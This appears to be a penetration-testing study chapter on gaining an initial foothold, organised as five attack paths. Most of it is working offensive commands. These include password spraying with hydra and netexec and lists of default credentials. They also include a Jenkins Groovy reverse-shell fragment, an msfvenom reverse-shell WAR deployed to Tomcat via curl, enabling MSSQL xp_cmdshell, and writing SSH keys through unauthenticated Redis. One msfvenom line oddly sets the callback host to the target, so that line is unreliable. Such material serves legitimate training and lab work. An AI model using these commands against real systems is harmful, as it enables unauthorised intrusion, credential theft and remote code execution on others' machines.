# Initial Foothold

**Turning "open port" into "shell on the box."** After enumeration you have services + versions. The foothold comes from one of five paths: a public exploit, default/weak creds, a web vuln, an exposed admin/deploy interface, or a leaked credential. Work them in that rough order of speed.

> Before exploiting, ask: *what does this version get me?* `searchsploit <service> <version>` first — a public RCE is faster than brute force.

---

## Path 1 — Public Exploit for a Known Version

```bash
searchsploit apache 2.4.49
searchsploit -m 50383            # copy an exploit locally
# Also check nuclei / metasploit
nuclei -u http://{target} -severity critical,high
msfconsole -q -x "search <product>"
```
Read the exploit before running it. Adjust `LHOST`, `LPORT`, target URL, and offsets. If it's a metasploit module, `set RHOSTS {target}` / `set LHOST tun0`.

---

## Path 2 — Default & Weak Credentials

Try the obvious first — it wins more boxes than people admit.
```bash
# Service logins (see Password Attacks chapter for full hydra/netexec syntax)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4
nxc smb {target} -u users.txt -p passwords.txt --continue-on-success
nxc winrm {target} -u admin -p admin

# Common default creds to try by hand:
#   admin:admin  root:root  admin:password  tomcat:tomcat  postgres:postgres
#   sa:(blank)   guest:(blank)   jenkins:jenkins   grafana admin:admin
```
Search default creds for the exact product (`searchsploit <product> default`, vendor docs, or the DefaultCreds-cheat-sheet).

---

## Path 3 — Web Application Vulnerability

The most common CPTS foothold. Full workflow + payloads in the **Web Attacks** and **Payloads** chapters. Fast checklist:
```bash
# 1) Identify + discover
whatweb -a3 http://{target}; gobuster dir -u http://{target} -w .../directory-list-2.3-medium.txt -x php,txt,bak
# 2) Exploit the class you find:
#    SQLi -> sqlmap --os-shell    |    upload -> web shell    |    LFI -> log poisoning
#    SSTI -> RCE payload          |    command inj -> reverse shell
# 3) Land a reverse shell (start listener first!)
```
Upload/deploy interfaces are gold: **Tomcat manager** (deploy WAR), **Jenkins** (Groovy script console), **phpMyAdmin** (`SELECT ... INTO OUTFILE`), **Gitlab/Grafana** (CVE-driven).

```bash
# Jenkins Script Console -> instant RCE (Manage Jenkins > Script Console):
# Groovy:
String host="{target}";int port=4444;String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);/* ... classic groovy rev shell ... */

# Tomcat manager WAR deploy:
msfvenom -p java/jsp_shell_reverse_tcp LHOST={target} LPORT=4444 -f war -o sh.war
curl -u tomcat:s3cret -T sh.war "http://{target}:8080/manager/text/deploy?path=/sh"
curl "http://{target}:8080/sh/"     # trigger it
```

---

## Path 4 — Exposed Service / File Share

```bash
# Anonymous FTP / writable share -> drop a payload where the web server executes it
ftp {target}      # anonymous
smbclient -N //{target}/share
# NFS export -> mount and read/write
showmount -e {target}; sudo mount -t nfs {target}:/export /mnt

# Databases exposed to the network
mysql -h {target} -u root                     # blank/weak root
impacket-mssqlclient sa:'Password1'@{target}  # then enable xp_cmdshell
redis-cli -h {target}                         # unauth redis -> write SSH key / web shell
```

MSSQL → RCE via `xp_cmdshell`:
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

---

## Path 5 — Leaked / Reused Credentials

Creds you found earlier (web config, git repo, SMB share, `.bash_history`) almost always unlock something else.
```bash
# Spray a found password across every service and host
nxc smb {target} -u found_user -p 'FoundPass!'
nxc ssh {target} -u found_user -p 'FoundPass!'
evil-winrm -i {target} -u found_user -p 'FoundPass!'
```

---

## After You Get the Shell

1. **Upgrade to a TTY immediately** (Payloads chapter). A dumb shell dies on `su`/`ssh` and Ctrl-C kills it.
2. **Stabilise & orient:** `id` / `whoami /all`, `hostname`, `ip a`, `sudo -l` (Linux) / `whoami /priv` (Windows).
3. **Grab low-hanging creds** and enumerate for privesc (chapters 06/07).
4. **Note the callback** (LHOST/LPORT) and how you got in — you'll need it for the report.

## Common Mistakes

- **Brute-forcing before checking `searchsploit`.** A public RCE for the exact version is faster and cleaner.
- **Skipping default creds.** `admin:admin` / `tomcat:tomcat` open a surprising number of doors.
- **Firing an exploit without reading it.** Wrong LHOST/offset = crash or no callback; some "exploits" are traps.
- **Not upgrading the shell.** Half your commands fail in a dumb shell — fix the TTY first.
- **Ignoring reused creds.** The DB password from a web config is very often an SSH/WinRM password too.
